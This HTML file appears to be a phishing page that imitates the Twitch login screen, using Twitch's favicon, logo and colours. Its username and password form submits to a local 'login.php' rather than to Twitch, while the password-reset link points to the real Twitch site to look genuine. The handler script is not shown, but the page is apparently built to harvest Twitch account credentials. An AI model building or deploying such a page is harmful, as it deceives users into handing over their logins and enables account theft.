<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Log In | Twitch</title>
  <link rel="icon" href="https://static.twitchcdn.net/assets/favicon-32-e29e246c35.png" sizes="32x32">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: "Roobert", "Helvetica Neue", Helvetica, Arial, sans-serif;
    }

    body {
      background: #0e0e10;
      color: #efeff1;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 16px;
    }

    .login-container {
      background: #18181b;
      border-radius: 8px;
      padding: 32px;
      width: 100%;
      max-width: 400px;
      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.5);
    }

    .logo {
      text-align: center;
      margin-bottom: 24px;
    }

    .logo svg {
      width: 40px;
      height: 40px;
    }

    .logo-text {
      font-size: 24px;
      font-weight: 800;
      color: #9146ff;
      margin-top: 8px;
      letter-spacing: -0.5px;
      text-shadow: 0 0 2px rgba(145, 70, 255, 0.3);
    }

    .logo-text:hover {
      color: #772ce8;
      text-shadow: 0 0 4px rgba(145, 70, 255, 0.5);
    }

    h1 {
      font-size: 20px;
      font-weight: 600;
      text-align: center;
      margin-bottom: 24px;
      color: #efeff1;
    }

    .input-group {
      margin-bottom: 16px;
    }

    label {
      display: block;
      font-size: 14px;
      margin-bottom: 6px;
      color: #a9aaa9;
    }

    input {
      width: 100%;
      padding: 10px 12px;
      background: #212124;
      border: 1px solid #4b4b50;
      border-radius: 4px;
      color: #efeff1;
      font-size: 16px;
    }

    input:focus {
      outline: none;
      border-color: #9146ff;
      box-shadow: 0 0 0 2px rgba(145, 70, 255, 0.2);
    }

    button {
      width: 100%;
      padding: 10px;
      background: #9146ff;
      color: white;
      border: none;
      border-radius: 4px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      margin-top: 8px;
    }

    button:hover {
      background: #772ce8;
    }

    .forgot-password {
      text-align: center;
      margin-top: 16px;
    }

    .forgot-password a {
      color: #007aff;
      text-decoration: none;
      font-size: 14px;
    }

    .forgot-password a:hover {
      text-decoration: underline;
    }

    @media (max-width: 480px) {
      .login-container {
        padding: 24px;
      }
      h1 {
        font-size: 18px;
      }
    }
  </style>
</head>
<body>
  <div class="login-container">
    <div class="logo">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 28" width="40" height="40">
        <g fill-rule="evenodd">
          <path d="M19 6v6h-2V6h2zm-7 0h2v6h-2V6zM5 0L0 5v18h6v5l5-5h4l9-9V0H5zm17 13l-4 4h-4l-4 4v-4H6V2h16v11z"></path>
          <path d="M18 17l4-4V2H6v15h4v4l4-4h4zM12 6h2v6h-2V6zm7 0h-2v6h2V6z" fill="#FFF"></path>
        </g>
      </svg>
      <div class="logo-text">TWITCH</div>
    </div>

    <h1>Log in to continue</h1>

    <form method="POST" action="login.php">
      <div class="input-group">
        <label for="username">Username or email</label>
        <input type="text" id="username" name="Username" required autocomplete="username" />
      </div>

      <div class="input-group">
        <label for="password">Password</label>
        <input type="password" id="password" name="password" required autocomplete="current-password" />
      </div>

      <button type="submit">Log In</button>
    </form>

    <div class="forgot-password">
      <a href="https://passport.twitch.tv/password_resets/new" target="_blank">Forgot your password?</a>
    </div>
  </div>
</body>
</html>